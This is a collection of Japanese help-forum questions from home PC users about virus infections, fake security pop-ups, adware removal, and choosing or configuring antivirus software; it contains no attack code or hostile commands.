初心者です。 先日、外付けHDDがウイルスに感染しました。 またたくまに、広がり、なんでもない写真なども。 カスペルスキーで、すべて削除、駆除しましたが、 USBにつなぐと、また復活し、なにかと感染します。 もちろん、USBにつなぐと、マシン本体にも感染します。 （オートランができ、ウイルス本体が作成される） 駆除した後、外したまま眠ってます。 このHDDは、もう処分するしかないのでしょうか。 それとも、なにか他の対策があり、現役で使用できますでしょうか。 （フォーマットなど） 今は、つなげるのは怖いです。 まだ購入したばかりなので、フォーマットして使用したいです・・・。 アドバイスありましたら、よろしくお願いします。 ●Windows　7　64 ●バッファロー　USB2.0　２T
Vista＋WindowsMailに、送られてくるメールマガジンを開くと、 日本語が数行並び空白行が数行続くような画面になります。 調べると、S/MIMEに対応していないとのことです。 S/MIMEの意味は分かりませんが、これに対応させるには、どうしたらよいのでしょうか?
yahoo！ファイナンスの掲示板で、書き込みの中に記載されていたwebサイトにクリックした瞬間、サイトを表示することなくgoogle chromeが閉じられ、再起動されました。 chromeが閉じられた際にはクラッシュ？なのか、四角い顔のキャラが目を×にして表示され、再起動の際には「windows更新プログラムが・・・・とか、○％とか」表示されました。 これはウイルスなのでしょうか？ それとも更新プログラムを起動する瞬間と、webサイト表示が偶然にも一致しただけなのでしょうか？ ウイルスバスターのクイック検索では特に引っ掛からなかったのですが、PC内のデータが抜き取られたりしたら非常に不安です・・・・ どうしたらよいでしょうか。アドバイスをお願いします。
ウイルスバスタークラウドのリアルタイムのウイルス検索って本当にリアルタイムなんですか?それとも何分か遅れはあるんですか?
現在Norton intenet Security ウイルス対策ソフトを使用、残り有効期限が１年３カ月ほどあります。 最近McAfee Security Scan Plusウイルス対策ソフトが、私のPCに入り込み、グレードアップした ウイルス対策ソフトを買わないかと言う、表示がでます、現在使用のNorton intenet Security ウイルス対策ソフトとの問題が、発生しないでしようか?　　又 又　以前Babylonの迷惑ソフトを削除したら、PCの動作が、異常になり、リカバリしました。削除は、しない方がいいでしょうか?
Windows7です。　　ここ1ヶ月半前ぐらいから、それまでは一切なかった現象が起こります。 なお、そのころに基本ソフトの再セットアップはしました。 その現象とは、起動しているブラウザ（主にGoogleを利用しています）が、何もしないのに、勝手に終わってしまいます。 　そのあと、再度表示されるということではなくて、終わりっぱなしです。 それまでは、そういうことは全くありませんでした。 ２ヶ月前に戻ってでも復元をした方がいいでしょうか。 そういう現象が、ウイルスに関係しているのでしょうか。 そのあたり心配です。 セキュリティソフトは無料の[avast]です。 よろしくお願いします
あるウェブページを開こうとすると、カスペルスキーがフィッシングサイトかもしれない、と警告を出してきます。 しかしそのページというのが、ローカル環境で運用しているページなのです。そのページからネットワーク外部へのリンクはありません。仕事で使っているローカルに入れたMySQLのデータをブラウザ経由で閲覧しています。URLのGET部分のクエリが長いからなのかもしれませんが、クエリ部分が異なると警告がでないこともあり(というより、警告が出ない方が圧倒的に多い)おそらくクエリ部分がいけないのかもしれませんが、よくわかりません。 ヒューリスティック分析の結果、警告が出ているらしいのですが、どのあたりが問題だと思われますか？クエリの文字列は、調べ物をするごとに違いますがどれも似たり寄ったりの内容です。何か特定の文字列が含まれていると警告が出るとか、そういうのはあるのでしょうか？ 実際のクエリは仕事の内容なのでここにはかけませんが、こんな感じです。 localhost/shirabemono.php?db=abc&table=def%20hig(opqrst)%20utv&find=kensakuword&sort=date
いつもお世話になっています。 先日ここで、ワードに変わる無料のソフトを聞いたところ、「オープンオフィス」というのを勧められました。 さっそくダウンロードしようとしましたが、失敗したようです。 ところが、その直後から画面に「Ｙｏｕｒ　Ｃｏｍｐｕｔｅｒ　ｉｓ　ｒｅａｄ　ｔｏ　ｂａｃｋ　ｕｐ」というメッセージが画面に表示されます。 一度、ＯＫをしたところ、ウイルス検地をしたようですが、結局、ソフトを購入しろ、という画面に誘導されました。 どう対処すればいいのでしょうか。 パソコン音痴なので、わかりません。教えてください。
よく聞く会社しか知りませんが ウイルスバスター ノートン Microsoftセキュリティ どれも同じ防御率ですか？
スーパーウィルスセキュリティZEROを使用しております。 現在、プリンタとつながっていますが、プリンタの方でスキャンしたものが 自動的に自分のPCにデータが送られる設定をしているのですが、 どうもきちんと送られません。 プリンタ会社に相談したらスーパーウィルスセキュリティZEROに 問題がある、とのことです。 自分でも色々試してみましたが、以下の方法では不可でした ・ウィルス対策の例外設定にスキャンフォルダを入れた ・リアルタイム保護の設定をオフにする ・ファイアウォールの設定においてポートスキャン→オフ 　（設定した日だけスキャンできたが次の日は使用不可になった） 上記、全てエラーになってしまい、スキャンできません。 唯一できる方法はスキャンするときのみファイアウォールの設定を オフにすればスキャンすることが出来ます。 しかしこれでは、ウィルスセキュリティの意味がありません。 ソースネクストの電話は混雑してなかなかつながらないので 電話する前になるべく早く解決したいと思っております。 ネット回線等はまったくの初心者なので分かるように説明して 頂けたら大変ありがたいです。 よろしくお願い致します。
トロイの木馬に感染したようです。 先日ネットサーフィンをしていたら、Avast!がトロイの木馬を検知したというメッセージを寄越して来ました。 その後も数分に一回のペースで同じメッセージを寄越すので、怖くなり、セーフモードの状態でAVIRAのウイルススキャンをしましたが異常なしでした。 また、通常起動後にノートンの体験版を入れ、ウイルススキャンをしましたがこちらでも異常なしでした。 Avast!がウイルスを検知してから、頻繁にパソコンが唸った後にNIVIDIAが再起動するようになりましたが、それ以外は普通に使えています。 これは、Avast!の誤検出なのでしょうか？ それとも本当にウイルスが入っているのでしょうか？ ウイルスが入っている場合、取り除く方法はパソコンのリカバリしかないのでしょうか？ パソコンに詳しくないので大変困っています。どうか解答よろしくお願いします。 ちなみにパソコンはwin7で、 Avast!のメッセージは トロイの木馬を検出しました アバスト！ファイルシステムシールドが脅威をブロックしました。これ以上の処理は必要ありません。 オブジェクト: C:\users\username\AppData\Local\Temp\iswizard\wuaudit.exe 処置: チェストへ移動しました 感染: Win32.BitCoinMiner-CA[Trj] プロセス: C:\windows\SysWOW64\rundll32.exe ファイルが作成または書き換えられる時に脅威を検出して阻止しました。 というものです。 長文かつ乱文になってしまいましたが、御回答よろしくお願いします。
パソコン内のトロイの木馬を退治するために再インストールしようと思っています。その場合、オペレーションプログラムの入っているドライブC だけの 再インストールでは やはり だめでしょうか。 たとえば、ドライブC の再インストールをまずやって、それでもウィルスが検出されるようなら、ほかのすべてのドライブを再インストールするというやり方ではだめでしょうか。
gooで提供している無料ウイルスソフト（JUSTインターネットセキュリティ for goo）を実際に使用している方にお聞きしたいです！ 市販の有料ウイルスソフトとの比較を教えて下さい。 私は長年ノートンを使用してます。
トレンドマイクロ　オンラインスキャンで、Updat　tasuke、スパイウェア、が検出されました。 ファイルとフォルダーの検索、レジストリー情報の検索、を行っても全く解りません。 Updat　tasuke、スパイウェア、を見つけて削除したく思います。 Updat　tasuke、スパイウェアを見つける方法を教えて下さい。 被害が出ているPCには、セキュリティソフトが入っていません。 PCはWin　ｘｐ　ｓｐ３です。
(A) http://unixfreaxjp.blogspot.jp/2010/06/javascrip … の ２）マルウェアをダウンロードさせるjavascript を見ると、javascript での exeファイル(実行ファイル)のダウンロードが可能みたいですが ダウンロードだけで終わらずに、実行ファイルをダウンロード後にアプリケーション・OSに脆弱性がなくても実行まで出来てしまうのでしょうか？ 実行ファイル以外の拡張子のファイル(PDF・フラッシュなどのファイル)をダウンロードさせ、それらのファイルのアプリケーションに脆弱性があるときに悪意のあるコードを実行させられることはよく聞きます。 実行ファイル以外のファイルによって対応アプリケーションの脆弱性を狙う方法ではなく、 javascriptで実行ファイルをダウンロードさせそのまま実行までさせることは出来るのでしょうか。 (B) http://unixfreaxjp.blogspot.jp/2010/07/javascrip …　に 「dropper」種類ですが次回に説明しますけど(dropperとはjavascriptマルウェアですがマルウェア実行プログラム/binaryファイルがjavascriptのマルウェアコードの中にあり、javascriptマルウェアを実行したらパソコンにマルウェア実行ファイルを保存されてしまいます) とあります。 ブラウザがjavascriptを読み込んだ時点で、そのjavascriptはパソコン内にダウンロード(保存)されているわけですが、 javascriptのマルウェアコードの中にあるマルウェア実行プログラム/binaryファイルは、OS,アプリケーションに脆弱性がなくても、保存にとどまらず実行までされてしまうのでしょうか。 (A),(B)について教えてください。
サイトを閲覧しようとしたら、ＪＡＶ・・・・見れませんと出てきたので「ＯＫ」をおしてしまったら Internet Security Pro って出てきました そのご、すべて英語で表記されるウィンドウが出てきます 調べたら、怖いにせウィルスのようです どうしたらよいでしょう 量販店が開いたら行こうと思ってますが、とても不安です
最近パソコンを買い、今までは試用期間のウイルスブロックを使っていたのですが、昨日その期限が切れてしまいました。 もしウイルスブロック用のソフトとかを使用しない状態で、インターネットをしたら、どうなりますか？やっぱウイルス感染しちゃうのでしょうか。そもそもウイルス感染したらパソコンはどうなるのでしょうか。感染したあとでウイルスブロックソフトを使っても遅いですか？ よろしくお願いします。
●テキストファイル(拡張子 .txt) ●画像ファイル(拡張子 .png .gif .bmp .jpg) にスクリプトを埋め込むことは果たして可能？ ================================ スクリプトを埋め込むことが可能なら、デスクトップ上にあるそれらのファイルを 対応アプリケーションで開くと、どのようなことが出来てしまうのか教えてください。 (アプリケーション・OSには特にセキュリティホールはないとします) ○インターネットに接続する ○対応アプリケーションとは別のアプリケーションを起動させてインターネットに接続する ○インターネットに接続はしないが、対応アプリケーションに関するファイルを勝手に書き換えてしまう ○インターネットに接続はしないが、対応アプリケーション以外のパソコン内の環境でさえ勝手に書き換えてしまう 私の思いついたことはこのあたりです。 ================================ インターネットに接続する場合ですが、 インターネットに接続し、その後の一連の仕掛けられた罠によってマルウェアに感染してからの遠隔操作ではなく、 スクリプトによる最初のインターネット接続だけで、遠隔操作が出来る状態になっているのかについても教えてください。
2013年度版(1台)はいつ発売になるのでしょう?
イラスト素材を探している最中 セキュリティソフトから『ＰＣに脅威を及ぼす…』で再起動を促す警告が出て再起動しました。 再起動後、デスクトップの背景は黒一色 そして見慣れないファイル《desktop.ini》が2つ《Thumbs.db》が表示されています。 削除しようとすると…Windowsまたは他のプログラムが正しく動作しない可能性があります と、表示されます。 (1)やはり削除しないほうが良いのでしょうか？ それから、外付けのハードディスクを2つ接続していますが 何故か今まで無かったゴミ箱が出てきました。 削除しても、再度開くとまたゴミ箱が… 何度繰り返してもゴミ箱が復活しています。 (2)ゴミ箱はどうやったら無くなるのでしょうか？ もしかしたら、この２点以外にも以前と変わったところがあるのかもしれません。 (3)元に戻す方法があるのでしょうか？ セキュリティレポートを開くと 確かに昨日ウィルス＆スパイウェアが３つ削除された。 と、あります。
ここ数日PCを立ち上げるとウィルスバスターが頻繁に上記HTML_REDIR.BGSをウイルス/脅威としてポップアップします。 影響を受けるファイルとして下記ファイルが挙がってきます。 「検出されたすべての脅威が解決されました」と出てくるのですが 1時間に何回も出てくるので鬱陶しいです。 C:¥Users¥xxxx¥AppData¥Local¥Packages¥microsoft.windowscommunicationsapps_8wekyb3d8bbwe¥LocalState¥LiveComm¥17f5dabfd3c76d7f¥120712-0049¥Att¥33f65b81-0b6e-4245-a6f9-91982fccfc66¥FullDetails.html 検索しても今ひとつヒットしません。 当方Windows8 Pro 64bit ご教授下さい。
メールソフトを使わず、Gmailにブラウザでログインしています。 標準HTML形式だと、届いたメールを開くだけでjava scriptやiframeなどによってマルウェアがダウンロードされて感染してしまいますか。 簡易 HTML形式だと、件名一覧のところに、プレビュー機能が働いているためなのか、件名以外に本文までも表示されています。簡易 HTML形式で届いたメールを開かなくてもウィルス感染はありますでしょうか。 また、簡易 HTML形式の時に、届いたメールを開いてもウィルス感染はしないでしょうか。 もちろん添付ファイルについては標準HTML・簡易HTMLのどちらでも開くことはありません。
同じメールが立ち上げる度に何回もきます ウイルスに感染したのか？　受信したメールを削除しても再度開くと同じメールの受信表示がされます。10回立ち上げると　同じメールが10回受信表示される状態です。少しほっておくと2000件位までたまってしまい　メールがまともに見れない状態です。どなたか解決方法を教えてください。
数ヶ月前頃からSystweak Softwareというソフト発行元から「あなたのパソコンには非常に多くの感染ファイルがあり、このままだとそのうちパンクしますよ。わが社のSystweak Reg Clean Proというソフトをインストールして感染ファイルを除去することを強くお勧めします」といった趣旨の警告が毎日執拗に画面に現れます。これと同じグループなのか不明ですが、PC Power Speedという会社名？でSpyware Terminatorというソフトの推奨も毎日現れます。ずっと無視していましたが最近パソコンのスピードが遅くなったように感じるので、試しに前者（Systweak Reg Clean Pro）の無料の感染度チェックのソフトをクリックしてみたところ、10分程度スキャンして「139件の感染ファイルがあり。これを退治してパソコンのスピードを回復させるには、わが社の有料ソフトの購入を強く推奨します」と表示され、とりあえず胡散臭いのでそれ以上進めてはいません。 でもこれが本当のことなら対処したほうが良いのかなとも思い、迷っています（パソコンの立ち上がりやExplorerの立ち上げに以前より時間が掛かっているように感じるので）。 これらの会社やその警告は信用に値するものなのか、ご存知の方にお聞きしたいと思います。 よろしくお願いします。
初心者です・・・。 先日、Ad-Aware社の、「Ad-Adware-Personal」の体験版をDLしましたが、 何度やっても、フリーのままです・・・。 試しに上位の、Pro版でも同じでした。 EXEファイルが同じなので・・・ フリー以外に有料を使用してる方はおられますでしょうか。 もしそうなら、どうすれば、フリー以上のインストールできるか教えてください。 よろしくお願いします。
「コンピューターにutilJsonHandle.dllがないため、プログラムを開始できません。この問題を解決するには、プログラムを再インストールしてみてください。」　の表示が消えません。 過去の記事を読み、ウイルスバスター2012クラウドを何回かアンインストールとインストールをしてみましたが、消すことができません。　他のPCで全く同じ設定（ウイルスバスター2012クラウドは3台分購入）で使用していますが、こちらは全く問題ありません。 システムチューナーについて書かれている方もいらっしゃいますが、この対策についてもご教授いただければ幸いです。PCはレノボ　Thiknkpad　X121e　でWindows 7　を使っています。 宜しくお願いいたします。
次の各マルウェア対策ソフトは、Mozila系のブラウザ（Firefox等）とChrome系には対応していますでしょうか？（FirefoxやGoogle Chromeでブラウジングしている時でも、保護されている状態になっていますでしょうか？） また、下記の中でお勧めのソフトがあれば、その理由も含めて是非、教えていただけたら幸いに思います。 １．「ESET ファミリーセキュリティ」 ２．「F-Secure インターネットセキュリティ 2013」 ３．「G-DATA インターネットセキュリティ 2014」 PCには、あまり詳しくない者なので、質問いたしました。 すみませんが、どなたか回答のほどお願い申し上げます。
インターネットエクスプローラ９をリセットしなおしたら、 IE9を立ち上げた際「smartscreenフィルターを設定しますか？（推奨）」と出てきました。 これは、設定した方がよいのでしょうか？ 今はセキュリティーソフトとしてノートンインターネットセキュリティーが入っています。 入っているなら設定した方がいいのか、しない方がよいのか教えてください。 よろしくお願いします。
昨日、無料のウィルス対策のＫＩＮＧＳＯＦＴをインストールしました。 画像を取り込もうと思いＳＤカードを挿入したところ 自動的に、ＤＣＩＭに保存されるので 画像を見たいときに、ＳＤカードを入れて コンピューターにいき、ＤＣＩＭからしかファイルが開きません また、ＳＤカードにも、画像は残っていませんでした。 今までは、ウィルスバスターの有料版でした。 ＳＤカードを挿入すると かならず、動画と画像の読み取りが表示され マイピクチャに保存されていました。 ＳＤカードの画像も、削除しないかぎり、ＳＤカードにも画像が残っていました。 画像が見たいときに、ＳＤカードを入れないといけないので とても、困っています。 アドバイスをお願いします。
現在ウイルスセキュリティＺＥＲＯを使っています。 この度ＷｉｎｄｏｗｓＸＰｐｒｏとWin８を一つのＨＤＤに入れ、デュアルブートとして使いたいと思っています。 通常ウイルスセキュリティＺＥＲＯは立ち上げたOSの上からインストールしますが、デュアルブートの場合はOS毎にライセンスが必要となるのでしょうか。
実環境のアプリから仮想環境のアプリへアクセスできる時には 仮想環境から実環境へアクセスし、実環境を変えてしまうことができるか教えてください(_ _) kaspersky internet security 2012 でブラウザを仮想化しています。 タスクトレイに常駐し実環境にある wheel redirector で 仮想化されたブラウザのウィンドウをスクロールさせ タスクトレイに常駐し実環境にある Clibor で仮想化されたブラウザで表示されているページの文字をコピーしたり、ページへ貼り付けたりしています。 また実環境にある MicrosoftIMEで　仮想化されたブラウザでアクセスしたページの文字入力欄に文字を入力しています。 [実環境のアプリ] wheel redirector、Clibor、 MicrosoftIME [仮想環境のアプリ] 仮想化されたブラウザ 仮想化されたブラウザがマルウェアに遭遇したときに ○仮想環境のアプリへアクセスしている実環境のアプリのセキュリティホールが狙われて実環境が変えられてしまう。 あるいは ○仮想環境のアプリへアクセスしている実環境のアプリのセキュリティホールが攻撃されなくても、実環境のアプリから仮想環境のアプリへの経路を利用して仮想環境から実環境へのアクセスが可能になり、実環境を変えられてしまう。 このようなことが起こり得ますでしょうか？ どうか回答をお願い致します(_ _)
PCをつけていると、時々英文が出てきて、勝手にアマゾンのサーチのページになってしまいます。 検索して調べてみるとこれはウイルスのようで（ウイルスバスターでも検出されませんでした）、これに感染するとCドライブにWinsystemというフォルダが出来て、それを削除すれば直るという情報も見つけましたが、私は検索してみても見つかりませんでした。 非常に作業の効率も削がれるので、早めに直したい所です。回答宜しくお願いします。
セキュリティソフト「KINGSOFT Internet Security 2013」を使っていれば、Windows Defenderは無効にしたほうがいいのでしょうか？ KINGSOFT Internet Security 2013は使うな！などの誹謗コメントはいりません。 回答お待ちしております。 http://download.kingsoft.jp/is/kis2012/dl-2/inde …
今　フレッツ・ウイルスクリア使っています。（月420円） 都合で　やめるのですが、これに勝るか同等品を探しています。 ネット購入でも、通販CD版でも構いません。 宜しくお願いいたします！！　　　　　
メールの添付ファイルが開くことも、保存することもできません。 また、ネット上にあるファイルも開くこともダウンロードもできません。 保存ページでデスクトップに保存にしても保存されていません。 セキュリティソフト2012（キングソフト）を入れています。 ブラウザはsleipnirを使っていますが、IEなら大丈夫かもとIEでダウンロードしようとすると「●●●にはウィルスが含まれていたため、削除されました」と表示されます。 キングソフトが原因かと思うのですが、一時停止しても、この表示がでます。 同じパソコンでユーザー切替で主人も使うのですが、主人の方ではダウンロードできます。 対処方法を教えていただけますでしょうか？
Windowsにはファイアウォールというソフト（？）が入っていますが、 これとは別にウィルスバスターやノートンインターネットセキュリティーなどのソフトをインストールして使った方がよいのでしょうか？ ウィルス対策ソフトが多く販売されているということは、Windowsのファイアウォールはあまり役に立たないということですか？ 無料のウィルス対策ソフトもあるようですが、信頼できるものですか？ よろしくお願いします。
PC買い替えにより、Win8のPCに期限の残ってるウイルスバスター2011クラウドをインストールしようと思いましたが、非対応。 既存のPCのOSを８へアップグレードする場合は、ウイルスバスターをバージョンアップさせればいいようですが、前記の場合はどうしたら良いのでしょうか？ お知恵をお貸し下さい。
　先日ウイルスバスターの無料アップデートの通知が来たのでクリックしたところ、今まであった物をアンインストールしてウイルスバスタークラウドをダウンロードすることになりました。 　しかし最後に「インストールは完了していません」と出て、何度やってもウイルスバスタークラウドを起動できません。しょっちゅうウイルスバスタークラウドが無効になっていますという警告文が出てくるのですが、コントロールパネルでもウイルスバスターを有効にすることができません。 　一応Ｔｒｅｎｄ　Ｍｉｃｒｏのサポート情報にある「インストールは完了していません」がでた場合の対処法、アンイントールツールの実行、手動インストールのやりなおし、windows updateの更新などはやりました。 　あとほかにどうすればいいのでしょうか？　アドバイスお願いします。
パソコンを早くするためのソフトをマイクロソフト社のパートナー企業からお試しダウンロード後、正式に購入たところ、同じパートナ企業や他のパートナー企業からっもあなたのパソコンは危険な状態にあります。至急購入するよう脅しがはいってきます。そのまま無視してパソコン使用できますが、目障りな上、不愉快です。購入したREGCLEAN　PROはアメリカと思ったらドイツでした。連絡しようにも言葉は分からないし困りました。どなたかよい解決法がご存知でしたら教えてください。
　いくつか開けないホームページがあります。ウイルス対策ソフトのメーカーや、証券会社の一部の機能が使えません。 　動作環境は適応しているので、原因はウイルスではないかと知人に言われました。 　ちなみにWindowsアップデートも使えません。 　あちこちで調べてはみたのですが、当方素人のため今ひとつやり方がわかりません。 　事情があり、リカバリーはできないのですが、ほかのやり方を素人の私にもわかるようにどなたか説明して頂けませんでしょうか？ 　ちなみにOSはXPです。 　
とあるファイルをDLして開いたところ、ウイルスが検出されました。この脅威を削除するには再起動を行ってくださいと出たので、該当ファイルを手動で削除した後、再起動を行いました。 ログを確認してみると、処理が『検出済み』としか出てないのですが、大丈夫なんでしょうか？
フリーソフトのウイルス対策ソフトのspybotは個人が作ったのですか？作者は誰ですか？ それともどこかの会社がつくったのですか？ 回答よろしくお願いします。
windowsXPでめちゃくちゃ遅いです。 回線が遅いんじゃなくてPCの動作がすべて遅いです。 セキュリティーソフトのマカフィーを買ったのでインストールしようと思っているのですが、 もっと遅くなりますか？インストールに時間がかかりますか？
買ったばかりで、一度もネットワークにつなげていないパソコン(Windows8)があります。 ウィルス対策ソフトはインストールされていません。 ウィルス対策ソフトをインストールするため、ウィルスバスターを買いにいったら、 店の人に「最新版のウィルスバスターはディスクは使わない。インターネットにつないで、ネットワークを通じてインストールする。」と言っていました。 そもそも、ウィルス対策ソフトが入っていないパソコンなので、インターネットにつなぐのは危険だと思うのですが。。。 これで、安全にインストールできるのでしょうか？ この方法が安全なのか、危険なのか？ もしくは、他に、安全なインストール方法があれば、教えてほしいです。
インターネットで買い物をしたり、いろんなページを見ていると、電話番号の送信やクレジットカード番号の送信をブロックしました。とポップアップ窓で知らせてくれます。 セキュリティソフトはウイルスバスターですが、送信をブロックしてくれたことはうれしいのですが、 頻繁にポップアップ表示されるページもありいやになります。 これら悪質な抜き取りプログラムを削除する方法はありますか？　または、ブロックしましたというポップアップ表示を出なくすることができますか？ ウイルスバスターさんへ問い合わすのがスジかと思いますが、そのようなコーナーがありませんのでこちらでお世話になります。 よろしく
某大手中古車販売店にインターネットで無料中古車査定をした直後から、「出会い系」や「○○万円振り込みます」「メール見てくれましたか？」など、迷惑メール処理をしても新たな yahoo.co.jp から毎日20件以上の迷惑メールが来ます。 ヤフーでは当社のアドレスから発信されたのではないと言われますし、某大手中古車店からは当社とは関係ありませんと、まるでクレーマーの扱いをされます。 今まで殆どこの手のメールが来たことがありませんでしたので、他に検討つきません。 対処法は当方のメールアドレスを変えるしかないのでしょうか？ 仕事上メールアドレス変更は大変な作業になるので変更したくありません。 何か良い方法はありませんか？
AviraとAVGをインストールしたいのですが、両方インストールしても問題ないでしょうか？ 片方だけインストールした方が良いでしょうか？ 教えてください、お願いします。
息子に買い与えたパソコンのアンチウイルス（ノートン）の期限が切れてしまいました。更新するにはネット上で更新（カード番号を入力する？）するのがよいか、お店で買ってインストールするのがよいか、教えてください。初歩的な質問ですみません。
先日より毎回ではないのですがIEがQvo6.comから立ち上がってしまいます。（毎回ではなくたまにです。）それに関連してしてかFlash Playerも最新版をいれているのに上手く表示されなくなってしまいました。もしQVO6.com 削除の仕方を知ってましたら教えていただけますでしょうか。 OS　windows 7 「ツール」→「アドオンの管理では元のgoogleの設定のままになっています。
ブラウザを立ち上げたら必ず hao123 というのが第一タブにきますが これどう消しますか? コントロールパネルからはアンインストールしましたがまだなります また、これインストールした覚えないですがいつ入ったのでしょうか ちなみに、環境は ・dynabook T451/58E ・Windows 7 ・Google Chromeが主でその他 OperaやFirefoxやIEも(Operaだけは何故かhao123は出てきません)
ウイルス感染して 「迷惑メール送信の踏み台にされる」と言われますが この場合、その送信履歴などはＰＣ内に残るのでしょうか？ （知らない間に送信履歴が作られている等） もし迷惑メール送信された場合には ＰＣの負荷は高くなるものでしょうか？ この場合 (1) 常に負荷が高いままになる。 (2) 特定のアクション時（ブラウザ起動や アクセス時）のみ高くなる。 (3) 送信されていることが ほぼ分からない。 の内どれに当てはまりますか？ 分かりやすい 回答でお願いします。
教えていただきたいです。 マカフィーで「怪しいプログラムをブロックしました」とポップが表示されます。 名前は「Adware-Bprotect」 心当たりも無く、削除ボタンを押すと ------------ バンドルまたはスイート製品の一部としてインストールされた プログラムを削除仕様としています。 削除する前に、プログラムのライセンス契約を確認してください。 このプログラムを自動的に削除する場合には、「OK」をクリックしてください。 あるいは、「キャンセル」をクリックして、プログラムを手動で削除してください。 ------------ と表示されます。そのまま「OK」で削除しても しばらくするとまた「怪しいプログラムをブロックしました」とポップが表示されます。 これはウイルスの類なのでしょうか？スキャンをかけても何もひっかかりません。 詳細をご存じの方がおられましたら、よろしくお願いします。
パソコンのウイルス対策ソフトを一人で自作することは可能でしょうか？ウイルスバスターのような感じのものです。アップデートなども自分でして。 回答よろしくお願いします。
以前は、ノートンインターネットセキュリティ等の総合セキュリティソフトを入れておき、 更にスパイウエアの対策ソフトを入れる例が多かったと思いますが、 別のところで質問をした時に、今はそうでもないようなことをアドバイスいただきました。 なお、私のパソコンには、２００３年ぐらいから、 ・ノートンインターネットセキュリティ ・ad-aware ・spybot-search&destroy ・spyware blaster を入れております。 実際のところ、皆様は、ノートンインターネットセキュリティ等の「総合ソフト」の他、 どのようなソフトを入れて、対策をとっているのでしょうか？ 現在の鉄板というか定番の対応策をアドバイスいただけませんでしょうか。 なお、自分のＰＣの使い方ですが、 ネットサーフィンをしたり、ネットで買い物をしたりと、 まぁ、一般的と思われる使い方であります。 ※もちろん、どのような対策をしたとしても、新しい脅威やお粗末な使用方法に対して、 セキュリティソフトが万能ではないことは、理解しております。 よろしくお願いいたします。
よろしくお願いします。 今カスペルスキーのマルチプラネットホーム2013をWin8とAndoroidタブレットに入れてネットにつないでいますがもうそろそろ更新の時期なのでこのソフトを更新するか別のソフトに乗り換えるかで悩んでいます。 コスト的にはそう変わらないのですが先々のことを考えると更新もないのでこのソフトのほうがいいのではないの方がいいじゃないかとも考えて良いとも思っています。 http://www.sourcenext.com/product/bd/home/?gclid … Bitdefendarの日本バージョンみたいですが実際このソフトは使いやすいでしょうか？ 動作があまり遅くてストレスになるようなら今のソフトを更新しようかと思うのですが何せお試し版がないので良くわかりません。 性能面も含めてどちらが良いのかご教授してもらえれば助かります。
パソコンの反応が遅いのですが、無料で修正するソフトなんてありますかね？ コンピューターに感染ファイルがあるみたいです。
BIOSではなくUEFIのパソコンがあるとします。 (A)USBポートに接続されたMBRディスクのUSBメモリ または 外付けHDD (B)USBポートに接続されたGPTディスクのUSBメモリ または 外付けHDD (C)IDE/ATA機器のMBRディスクの内蔵HDD (D)IDE/ATA機器のGPTディスクの内蔵HDD F9またはF10 で起動デバイス選択画面を表示させたときには(表示させるだけでブートはしません) (A)(C)については UEFIはMBR=LBA0(ブートストラップローダ・パーティションテーブル・ブートシグニチャで構成される)を読みこむだけ。 この理解で正しいでしょうか？ ところで、MBRのブートストラップローダ・パーティションテーブル・ブートシグニチャの何れかがマルウェアに感染していた場合、そのマルウェアはメモリ上にロードされCPUで実行されるのでしょうか？それともメモリ上にロードはされないのでしょうか？ (B)(D)については EFIはLBA0～LBA33を読み込むだけ。 この理解で正しいでしょうか？ ところで、LBA0～LBA33がマルウェアに感染していた場合、そのマルウェアはメモリ上にロードされCPUで実行されるのでしょうか？それともメモリ上にロードはされないのでしょうか？ (参照したページ) マスターブートレコード http://ja.wikipedia.org/wiki/%E3%83%9E%E3%82%B9% … GUIDパーティションテーブル http://ja.wikipedia.org/wiki/GUID%E3%83%91%E3%83 …
　前にも同じ質問をし，画像も添付しましたが，画像が小さくわかりずらいとのことで， 再度添付しようとしましたが，やり方がわからず断念しました。 そのときの回答でセキュリティーの所見ましたが，わかりませんでした。 本日又アップデートの案内がパソコンデスクトップ画面にでてきました。 WIN7サービスパック１を使用しています。 この画面は何のアップデートでしょうか？ よろしくお願いします。
たった今、ゲームをダウンロードをしようとして開始したら、画面が横にぶれました。 危険なサイトだったのでしょうか？ ウィルスに侵入されたのでしょうか？
子供がパソコンにウイルルスバスターをいれるために電気店で　CDでいれるものを買ってきてしまいました。が・・・　子供のパソコンには入れるところがなく外付けHDDを買いに行ったところ 外付けではダウンロードできないと言われたみたいです。 もう返品もできないみたいなので、何か良い方法はないか教えてもらいたいです。 よろしくお願いします。
先日、mailer daemonから大量にメールが届きウイルスに感染している事が発覚しました。 問題のウイルスは駆除したので、その後メールパスワードの変更をしました。 １．数日後の本日、数件ではありますがまたmailer daemonの同様のメールが・・・ 送信の日付を見ると、駆除前のものでしたが、今頃届くのは「また感染した・駆除しきれてなかった」のか 「駆除前のものが遅れて届いた」のかどちらなのでしょう。 後者だとしたも、メールパスワードを変える前後にまたがった宛先不明のメールもmailer daemonは返してくるのでしょうか。 で、本日の対策。 ２．トレンドマイクロの「オンラインスキャン」を試してみると「fvJcrgR.exe」というファイル（ウイルス）が検出されました。 【C:\Users\○○\AppData\Local\Temp】に確かにあります。 まだ残ってたのか！？と思って早速無料体験版をインストール、スキャン。 すると脅威は０です。 あれ？？と思ってもう一度「オンラインスキャン」をすると、やっぱり同じものが検出されます。 これはどういうことなんでしょう？ そのファイルがＰＣ上にあるのは間違いないのですが 無料体験版の方が劣るなんてことあるんですか？ トレンドマイクロ社の罠？？なんてと思ってしまいます。 このファイルは放置していていいのでしょうか。 【C:\Users\○○\AppData\Local\Temp】の中身を自分で削除しても大丈夫ですか？ ディスクのクリーンアップはやりましたが、残ってます。
他人の家でノートパソコン使う時、ウイルスバスター入ってますがそのまま使ってセキュリティー大丈夫でしょうか？一応ウインドウズの自動更新入れています。初心者ですみません
迷惑メールが多く困ってます。 自動で迷惑メールフォルダーに分離されるため問題はありませんが、毎回迷惑メールフォルダーに行き、削除するのも煩わしいため完全にブロックしようと思っています。 メルアドで遮断ができるようですが、メルアドを見るには一度その迷惑メールを開かなければならず、どうしたらいいか困ってます。 何か別の方法はあるのでしょうか？？
ノートンバスターマカフィがシェアのほとんどを占めてると昔の記事にありましたが今もおんなじでしょうか？ 仮にそうだとしたらなぜカスペルスキーやアヴィラなど、初心者には大きく評価されてるソフトは企業の専門家からはあまり高く評価されてないのでしょうか？両方とも昔からあるソフトですよね？ 事情に詳しい方がいたら教えてください。
